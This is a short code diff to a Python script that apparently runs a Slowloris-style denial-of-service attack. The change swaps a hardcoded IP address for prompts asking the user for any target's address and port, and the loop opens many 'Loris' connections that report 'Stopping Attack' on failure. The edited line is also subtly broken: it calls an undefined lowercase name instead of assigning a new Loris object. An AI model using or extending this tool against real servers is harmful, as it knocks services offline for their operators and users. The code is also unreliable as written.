@@ -39,10 +39,12 @@ def Main():
     lori = []
     running = True
     numberOfLori = input("How many lori? ")
+    addr = input("What is the target's Address? ")
+    port = input("What is the target's Port?")
 
 
     for x in range(int(numberOfLori)-1):
-        loris = Loris("172.217.22.174", 80, x)
+        loris(addr, port, x)
         if(not loris.running):
             print("Loris Could Not Connect Stopping Attack")
             break
